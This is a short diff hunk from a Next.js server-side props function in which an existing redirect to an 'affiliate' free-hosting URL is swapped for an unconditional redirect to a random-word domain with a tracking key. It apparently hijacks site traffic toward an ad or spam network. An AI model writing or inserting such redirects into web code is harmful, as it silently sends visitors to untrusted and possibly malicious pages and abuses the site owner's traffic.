@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://affiliate381.000webhostapp.com/`  + encodeURI(path as string)
+					`https://encumbranceunderlineheadmaster.com/wrybag52n?key=dcc017187c757dcf86234e51989724dc/`
 				}`,
 			},
 		};
